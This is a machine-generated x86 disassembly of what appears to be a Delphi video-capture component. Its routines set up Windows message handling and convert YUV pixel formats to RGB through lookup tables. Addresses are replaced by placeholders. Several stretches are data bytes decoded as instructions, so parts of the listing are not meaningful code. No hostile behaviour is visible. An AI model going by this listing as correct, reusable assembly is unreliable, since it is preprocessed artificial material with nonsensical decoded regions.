mov edx [ ebp + 0xc ]
mov [ eax + 0xc ] edx
pop ebp
retn 0x8
sub_463cec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
call sub_404a1c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_463d7f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_463778
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_463700
mov eax [ ebp - 0x4 ]
call sub_463718
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463d86
xor eax eax
push ebp
push sub_463d74
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_404640
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_463d7e
sub_463daf
inc [ eax ]
add [ eax ] al
add [ edi ] al
push esi
inc esi
jb r-xdata
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ ebx ] cl
push esp
push esi
imul esp [ ebp + 0x6f ] 0x67616d49
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
inc eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
xor edx edx
div ecx
mov [ ebp - 0xc ] edx
mov ebx [ ebp - 0xc ]
add ebx ebx
add ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + ebx * 8 + 0x1c ]
mov edx [ eax ]
call [ edx ]
xor edx edx
push ebp
push sub_463f19
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
lea eax [ eax + ebx * 8 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebx + 0x4 ]
je r-xdata
insd
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebx + 0x4 ] eax
mov edx eax
mov eax ebx
call sub_402f34
add [ eax ] al
add [ eax ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
inc esi
add [ esp + ebx ] dl
add al al
adc [ eax ] al
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add ah al
inc ecx
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebp + edi + 0x280046 ] bl
add [ eax ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
jmp r-xdata
mov [ ebx + 0x18 ] 0x0
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_4030fc
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c50 ]
call sub_42ee24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463f20
mov eax [ ebp - 0xc ]
add eax eax
add eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x28 ]
mov eax [ edx + eax * 8 + 0x1c ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_463f20
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
add eax eax
add eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x28 ]
mov eax [ edx + eax * 8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call PostMessageA
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463f64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x38 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_463fde
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa ] 0x1
mov eax [ ebp - 0x4 ]
call sub_46492c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
add eax eax
add eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x28 ]
lea ecx [ edx + eax * 8 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_464020
push ebx
push esi
push edi
push ebp
mov ebp eax
mov esi [ ebp + 0x30 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
call sub_404650
mov edx eax
mov eax [ ebx ]
call sub_402f1c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ee3c
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0x18 ] 0x0
inc edi
dec esi
jne r-xdata
call sub_404650
mov eax edi
add eax eax
add eax eax
mov edx [ ebp + 0x28 ]
lea ebx [ edx + eax * 8 ]
mov eax [ ebx + 0x4 ]
test eax eax
jle r-xdata
sub_4640a0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
mov [ edi + 0x9 ] 0x0
mov [ edi + 0x8 ] 0x0
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x1c ] eax
xor eax eax
mov [ edi + 0x20 ] eax
cmp esi 0x1
jae r-xdata
add esp 0xfffffff0
call sub_404974
mov [ edi + 0x30 ] esi
push esi
lea eax [ edi + 0x28 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
mov eax edi
call sub_464020
mov [ edi + 0x38 ] 0x696
xor eax eax
mov [ edi + 0x40 ] eax
mov [ edi + 0x44 ] eax
mov [ edi + 0xa ] 0x0
push edi
push sub_463f64
call sub_421140
mov [ edi + 0x34 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ edi + 0x1c4c ] eax
push 0x0
push 0x0
push r-xdata
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42edbc
mov [ edi + 0x1c50 ] eax
mov eax edi
test bl bl
je r-xdata
mov esi 0x1
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_464188
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ecx 0x1
xor edx edx
mov eax esi
call sub_4640a0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_4641c4
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
cmp [ esi + 0x9 ] 0x0
je r-xdata
mov eax [ esi + 0x1c50 ]
call sub_404650
mov eax [ esi + 0x34 ]
call sub_4211f4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
mov eax esi
call sub_464238
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_46420c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x1c50 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test al al
sete al
pop esi
pop ebx
retn
sub_464238
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c50 ]
call sub_42ee30
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x48
call sub_405530
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor edx edx
push ebp
push sub_464295
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_404650
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_464020
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9 ] 0x0
sub_4642b4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_464446
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0xc ]
add eax 0x48
call sub_405530
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0xffffffff
jge r-xdata
mov eax [ ebp - 0xc ]
call sub_464238
cmp [ ebp - 0x10 ] 0xffffffff
sete bl
mov eax [ ebp - 0xc ]
mov [ eax + 0xb ] bl
push ebx
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax + 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_462bb0
mov esi eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] esi
xor edx edx
push ebp
push sub_46438b
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x8 ]
push eax
push 0x1
mov eax esi
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_463504
test eax 0x80000000
sete al
neg al
sbb eax eax
cmp eax 0x1
sbb ebx ebx
inc ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x10 ] 0xffffffff
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x10 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0xc ]
call sub_464238
mov eax [ ebp - 0xc ]
mov [ eax + 0x9 ] 0x1
mov eax [ ebp - 0xc ]
add eax 0x48
mov edx [ ebp - 0x4 ]
call sub_405584
mov eax [ ebp - 0xc ]
push eax
push r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
call sub_463cc4
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
call sub_463b78
test eax 0x80000000
sete al
neg al
sbb eax eax
test eax eax
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_464d08
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46444d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
xor ebx ebx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x1c ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x20 ] edx
jmp r-xdata
sub_464458
push ebx
push esi
push ecx
mov esi eax
cmp [ esi + 0x1c4b ] 0x0
jne r-xdata
pop edx
pop esi
pop ebx
retn
xor ebx ebx
mov [ esp ] ebx
fild [ esp ]
fld [ r-xdata ]
fmulp st1
call sub_403450
mov [ esi + ebx * 4 + 0x4c ] eax
mov [ esp ] ebx
fild [ esp ]
fld [ r-xdata ]
fmulp st1
call sub_403450
mov [ esi + ebx * 4 + 0x44c ] eax
mov [ esp ] ebx
fild [ esp ]
fld [ r-xdata ]
fmulp st1
fld [ r-xdata ]
fsubp st1
call sub_403450
mov [ esi + ebx * 4 + 0x84c ] eax
mov [ esp ] ebx
fild [ esp ]
fld [ r-xdata ]
fmulp st1
fld [ r-xdata ]
fsubp st1
call sub_403450
mov [ esi + ebx * 4 + 0xc4c ] eax
mov [ esp ] ebx
fild [ esp ]
fld [ r-xdata ]
fmulp st1
fld [ r-xdata ]
faddp st1
call sub_403450
mov [ esi + ebx * 4 + 0x104c ] eax
inc ebx
cmp ebx 0x100
jne r-xdata
lea eax [ esi + 0x144c ]
xor ecx ecx
mov edx 0x7ff
call sub_403af4
xor ebx ebx
mov [ esi + ebx + 0x184b ] bl
inc ebx
cmp ebx 0x100
jne r-xdata
mov ebx 0x100
mov [ esi + ebx + 0x184b ] 0xff
inc ebx
cmp ebx 0x400
jne r-xdata
mov [ esi + 0x1c4b ] 0x1
sub_4645b8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov [ esp + 0xc ] eax
mov eax ebx
call sub_464458
mov eax [ esp + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
test eax eax
jl r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x8 ] 0x0
sar edx 0x2
add eax edx
imul ebp eax
add edi ebp
mov [ esp + 0x10 ] edi
mov eax [ esp + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ebp eax
mov eax [ esp + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
imul ebp eax
test ebp ebp
jns r-xdata
add edx 0x3
sar ebp 0x2
add [ esp + 0x10 ] ebp
mov eax [ esp + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx eax
sar edx 0x1
jns r-xdata
add ebp 0x3
dec edx
test edx edx
jl r-xdata
adc edx 0x0
inc [ esp + 0x8 ]
dec [ esp + 0x14 ]
jne r-xdata
inc edx
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_429b20
mov esi eax
mov edi [ esp ]
mov eax [ esp + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ebp eax
mov eax [ esp + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ esp + 0x8 ]
test edx edx
jns r-xdata
sar ecx 0x8
movzx ecx [ ebx + ecx + 0x184b ]
mov [ esi ] cl
inc esi
movzx ecx [ edi ]
mov ecx [ ebx + ecx * 4 + 0x44c ]
add ecx eax
mov ebp [ esp + 0x10 ]
movzx ebp [ ebp ]
add ecx [ ebx + ebp * 4 + 0x104c ]
test ecx ecx
jns r-xdata
add ecx 0xff
sar ecx 0x8
movzx ecx [ ebx + ecx + 0x184b ]
mov [ esi ] cl
inc esi
mov ecx [ esp + 0x10 ]
movzx ecx [ ecx ]
add eax [ ebx + ecx * 4 + 0xc4c ]
test eax eax
jns r-xdata
add ecx 0xff
sar eax 0x8
movzx eax [ ebx + eax + 0x184b ]
mov [ esi ] al
inc esi
inc [ esp + 0xc ]
mov eax [ esp + 0xc ]
movzx eax [ eax ]
mov eax [ ebx + eax * 4 + 0x4c ]
movzx ecx [ edi ]
mov ecx [ ebx + ecx * 4 + 0x84c ]
add ecx eax
test ecx ecx
jns r-xdata
add eax 0xff
sar ecx 0x8
movzx ecx [ ebx + ecx + 0x184b ]
mov [ esi ] cl
inc esi
movzx ecx [ edi ]
mov ecx [ ebx + ecx * 4 + 0x44c ]
add ecx eax
mov ebp [ esp + 0x10 ]
movzx ebp [ ebp ]
add ecx [ ebx + ebp * 4 + 0x104c ]
test ecx ecx
jns r-xdata
add ecx 0xff
sar ecx 0x8
movzx ecx [ ebx + ecx + 0x184b ]
mov [ esi ] cl
inc esi
mov ecx [ esp + 0x10 ]
movzx ecx [ ecx ]
add eax [ ebx + ecx * 4 + 0xc4c ]
test eax eax
jns r-xdata
add ecx 0xff
sar eax 0x8
movzx eax [ ebx + eax + 0x184b ]
mov [ esi ] al
inc esi
inc [ esp + 0xc ]
inc edi
inc [ esp + 0x10 ]
dec edx
jne r-xdata
add eax 0xff
mov eax [ esp + 0xc ]
movzx eax [ eax ]
mov eax [ ebx + eax * 4 + 0x4c ]
movzx ecx [ edi ]
mov ecx [ ebx + ecx * 4 + 0x84c ]
add ecx eax
test ecx ecx
jns r-xdata
sub_4647b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx eax
mov edi edx
mov eax ebx
call sub_464458
mov eax [ esp ]
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
test eax eax
jl r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x0
dec edx
test edx edx
jl r-xdata
adc edx 0x0
inc [ esp + 0x4 ]
dec [ esp + 0x8 ]
jne r-xdata
inc edx
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_429b20
mov esi eax
mov eax [ esp ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx eax
sar edx 0x1
jns r-xdata
sar ecx 0x8
movzx ecx [ ebx + ecx + 0x184b ]
mov [ esi ] cl
inc esi
movzx ecx [ edi + 0x1 ]
mov ecx [ ebx + ecx * 4 + 0x44c ]
add ecx eax
movzx ebp [ edi + 0x3 ]
add ecx [ ebx + ebp * 4 + 0x104c ]
test ecx ecx
jns r-xdata
add ecx 0xff
sar ecx 0x8
movzx ecx [ ebx + ecx + 0x184b ]
mov [ esi ] cl
inc esi
movzx ecx [ edi + 0x3 ]
add eax [ ebx + ecx * 4 + 0xc4c ]
test eax eax
jns r-xdata
add ecx 0xff
sar eax 0x8
movzx eax [ ebx + eax + 0x184b ]
mov [ esi ] al
inc esi
movzx eax [ edi + 0x2 ]
mov eax [ ebx + eax * 4 + 0x4c ]
movzx ecx [ edi + 0x1 ]
mov ecx [ ebx + ecx * 4 + 0x84c ]
add ecx eax
test ecx ecx
jns r-xdata
add eax 0xff
sar ecx 0x8
movzx ecx [ ebx + ecx + 0x184b ]
mov [ esi ] cl
inc esi
movzx ecx [ edi + 0x1 ]
mov ecx [ ebx + ecx * 4 + 0x44c ]
add ecx eax
movzx ebp [ edi + 0x3 ]
add ecx [ ebx + ebp * 4 + 0x104c ]
test ecx ecx
jns r-xdata
add ecx 0xff
sar ecx 0x8
movzx ecx [ ebx + ecx + 0x184b ]
mov [ esi ] cl
inc esi
movzx ecx [ edi + 0x3 ]
add eax [ ebx + ecx * 4 + 0xc4c ]
test eax eax
jns r-xdata
add ecx 0xff
sar eax 0x8
movzx eax [ ebx + eax + 0x184b ]
mov [ esi ] al
inc esi
add edi 0x4
dec edx
jne r-xdata
add eax 0xff
movzx eax [ edi ]
mov eax [ ebx + eax * 4 + 0x4c ]
movzx ecx [ edi + 0x1 ]
mov ecx [ ebx + ecx * 4 + 0x84c ]
add ecx eax
test ecx ecx
jns r-xdata
sub_46492c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
add eax eax
add eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x28 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x4 ]
call sub_4649c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x50 ] 0x1
jge r-xdata
call sub_4253d0
xor eax eax
push ebp
push sub_4649b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
add eax eax
add eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x28 ]
mov eax [ edx + eax * 8 + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
xor ecx ecx
xor edx edx
call sub_4252b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_425608
retn
sub_4649c0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_464bd7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464bde
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_405554
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ esi + 0x8 ]
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x14 ]
mov dl 0x6
call sub_42a930
mov edx [ esi + 0x8 ]
mov eax [ esi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0xc ]
mov eax [ esi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ esi + 0x14 ]
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ esi + 0xc ]
je r-xdata
sub eax 0x564e5559
je r-xdata
je r-xdata
xor ebx ebx
xor eax eax
push ebp
push sub_464bb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
cmp eax 0x32595559
jg r-xdata
mov eax [ esi + 0x8 ]
imul [ esi + 0xc ]
add eax eax
cmp eax [ esi + 0x4 ]
jne r-xdata
sub eax 0x703f0
je r-xdata
sub eax 0x1
jb r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ esi ]
mov eax edi
call sub_4647b0
jmp r-xdata
mov eax [ esi + 0x8 ]
imul [ esi + 0xc ]
lea eax [ eax + eax * 2 ]
sar eax 0x1
jns r-xdata
sub eax 0x3fc10
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi + 0xc ]
imul edi
lea eax [ eax + eax * 2 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
sub eax 0x30323448
je r-xdata
test bl bl
je r-xdata
cmp eax [ esi + 0x4 ]
jne r-xdata
adc eax 0x0
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov edx edi
dec edx
mov eax [ esi + 0x14 ]
call sub_429b20
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4030fc
jmp r-xdata
sub eax 0x1ff2210
je r-xdata
mov [ esi + 0x18 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ esi ]
mov eax edi
call sub_4645b8
jmp r-xdata
mov bl 0x1
jmp r-xdata
push esi
mov esi r-xdata
lea edi [ ebp - 0x5 ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
lea edx [ ebp - 0x4 ]
lea eax [ esi + 0x10 ]
mov ecx 0x4
call sub_4030fc
mov [ ebp - 0x5 ] 0x42475203
jmp r-xdata
push r-xdata
mov eax [ esi + 0x14 ]
call sub_4299b0
xor ecx ecx
xor edx edx
call sub_42548c
push r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
call sub_409d70
push [ ebp - 0x10 ]
push r-xdata
lea eax [ ebp - 0x14 ]
lea edx [ ebp - 0x5 ]
call sub_405794
push [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0xc ]
push eax
mov eax [ esi + 0x14 ]
call sub_4299b0
mov edx r-xdata
call sub_42558c
push eax
mov eax [ esi + 0x14 ]
call sub_4299b0
xor edx edx
pop ecx
call sub_42548c
sub_464c40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax esi
add eax eax
add eax eax
mov edx [ ebx + 0x28 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_464ce3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464cea
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jle r-xdata
mov eax esi
add eax eax
add eax eax
mov edx [ ebx + 0x28 ]
lea edx [ edx + eax * 8 ]
mov eax ebx
call sub_4649c0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ ebp - 0x1 ] 0x1
sub_464d08
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi edx
mov edi eax
cmp esi 0xffffffff
jge r-xdata
cmp esi 0xffffffff
je r-xdata
or esi 0xffffffff
mov eax edi
call sub_464238
mov ecx esi
mov edx [ edi + 0x48 ]
mov eax edi
call sub_4642b4
mov ebx eax
jmp r-xdata
cmp [ edi + 0xb ] 0x0
je r-xdata
mov eax ebx
add esp 0xc
pop edi
pop esi
pop ebx
retn
xor ebx ebx
mov edx esi
mov eax [ edi + 0x4 ]
call sub_463a9c
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax [ edi + 0x4 ]
call sub_463b78
test eax 0x80000000
jne r-xdata
mov [ edi + 0xb ] 0x0
mov bl 0x1
mov eax [ esp ]
mov [ edi + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x1c ] eax
mov eax [ esp + 0x8 ]
mov [ edi + 0x20 ] eax
sub_464de0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_404620
mov dl 0x1
mov eax [ r-xdata ]
call sub_464188
mov [ rw-data ] eax
xor edx edx
mov eax [ rw-data ]
call sub_464d04
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x5 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_464e3c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x5 ] 0x0
je r-xdata
